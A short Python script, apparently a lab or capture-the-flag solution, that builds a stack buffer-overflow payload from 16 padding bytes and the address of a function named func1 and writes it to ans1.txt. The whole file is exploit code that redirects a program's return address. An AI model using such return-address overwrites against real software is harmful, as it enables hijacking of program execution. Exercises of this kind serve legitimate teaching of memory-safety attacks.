padding = b"A" * 16

# func1: 0x0000000000401216
target_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"

payload = padding + target_addr

with open("ans1.txt", "wb") as f:
    f.write(payload)

print("Payload 已生成到 ans1.txt")